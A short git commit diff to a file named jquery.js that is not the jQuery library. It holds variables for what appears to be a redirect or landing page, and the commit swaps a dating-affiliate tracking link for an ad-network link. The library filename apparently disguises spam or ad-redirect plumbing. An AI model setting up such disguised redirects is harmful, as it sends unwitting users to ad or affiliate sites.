6aea18f593df7ae155fa77f0b2c791c24fef5b07
pejuangxkeluarga-source <pejuangxkeluarga@gmail.com>
2026-03-13 13:48:23 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,4 +1,4 @@
-var url="https://bjdbai.pixdates.com/s/5de5f8eacbde1?subsource=diablo&track=diablo&ext_click_id=diablo&sub1=diablo";
+var url="https://www.effectivegatecpm.com/b3emvsszs0?key=24ac8f74b6b0941716fbfc37866447b0";
 var time="0.0057539939880371";
 var top_text="";
 var img_url="https://pbs.twimg.com/media/G_bWmmrbIAAd-Lh?format=jpg";
